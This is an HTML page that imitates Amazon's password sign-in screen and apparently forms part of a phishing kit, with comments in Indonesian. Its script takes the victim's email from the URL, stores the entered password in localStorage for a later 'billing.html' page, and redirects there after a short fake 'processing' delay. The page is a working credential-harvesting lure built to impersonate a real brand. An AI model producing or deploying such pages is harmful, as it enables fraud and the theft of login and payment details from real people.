<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon - Enter Password</title>
    <script src="config.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Amazon Ember', Arial, sans-serif;
        }
        body {
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        .logo {
            margin: 10px 0 20px;
            text-align: center;
        }
        .logo img {
            height: 30px;
        }
        .kotak {
            width: 100%;
            max-width: 420px;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 25px 30px;
            background: #fff;
        }
        h1 {
            font-size: 22px;
            font-weight: 400;
            margin-bottom: 10px;
        }
        .email-terpilih {
            font-size: 14px;
            color: #111;
            margin-bottom: 15px;
        }
        .email-terpilih a {
            color: #0066c0;
            text-decoration: none;
            margin-left: 8px;
        }
        .email-terpilih a:hover {
            text-decoration: underline;
        }
        label {
            font-size: 13px;
            font-weight: 700;
            margin-bottom: 6px;
            display: block;
        }
        .lupa-sandi {
            font-size: 13px;
            color: #0066c0;
            text-decoration: none;
            float: right;
            margin-bottom: 15px;
        }
        .lupa-sandi:hover {
            text-decoration: underline;
        }
        input {
            width: 100%;
            padding: 7px 10px;
            border: 1px solid #a6a6a6;
            border-radius: 4px;
            font-size: 15px;
            height: 34px;
            margin-bottom: 20px;
        }
        input:focus {
            border-color: #007185;
            outline: none;
            box-shadow: 0 0 0 1px #007185;
        }
        button {
            width: 100%;
            padding: 8px 10px;
            background: linear-gradient(to bottom, #f7df74, #ecc000);
            border: 1px solid #b88600;
            border-radius: 4px;
            font-size: 15px;
            cursor: pointer;
            height: 36px;
        }
        button:hover {
            background: linear-gradient(to bottom, #f5d648, #d4a300);
        }
        button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        .footer {
            margin-top: 30px;
            font-size: 11px;
            color: #555;
            text-align: center;
        }
        .footer a {
            color: #0066c0;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="logo">
        <img src="./img/amazonlogo.png" alt="Amazon" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg'">
    </div>

    <div class="kotak">
        <h1>Sign in</h1>

        <div class="email-terpilih">
            <span id="tampilEmail"></span>
            <a href="index.html">Change</a>
        </div>

        <label for="password">Password</label>
        <a href="#" class="lupa-sandi">Forgot password?</a>
        <input type="password" id="password" name="password" placeholder="" required>

        <button type="button" id="tombolMasuk">Sign in</button>
    </div>

    <div class="footer">
        <p>
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </p>
        <p>© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script>
// === AMBIL EMAIL DARI URL / localStorage ===
let emailPengguna = "";

// Baca dari URL: ?email=...
const parameter = new URLSearchParams(window.location.search);
if(parameter.get("email")) {
    emailPengguna = parameter.get("email");
    localStorage.setItem("dataEmail", emailPengguna);
} 
// Baca dari localStorage jika tidak ada di URL
else if(localStorage.getItem("dataEmail")) {
    emailPengguna = localStorage.getItem("dataEmail");
}
// Jika kosong, kembalikan ke halaman utama
else {
    window.location.href = "index.html";
}

// Tampilkan email di halaman
document.getElementById("tampilEmail").textContent = emailPengguna;

// === KETIKA TOMBOL SIGN IN DIKLIK ===
document.getElementById("tombolMasuk").addEventListener("click", function() {
    const password = document.getElementById("password").value.trim();
    
    if(!password) {
        alert("Silakan masukkan kata sandi Anda");
        return;
    }
    
    // Simpan ke localStorage agar bisa dipakai di billing.html
    localStorage.setItem("password", password);
    
    // Tampilkan status
    this.disabled = true;
    this.textContent = "Memproses...";
    
    // Tunda sebentar lalu pindah ke billing.html
    setTimeout(() => {
        window.location.href = "billing.html";
    }, 800);
});

// === Tekan Enter untuk langsung masuk ===
document.getElementById("password").addEventListener("keypress", function(e) {
    if(e.key === "Enter") {
        document.getElementById("tombolMasuk").click();
    }
});
</script>
</body>
</html>
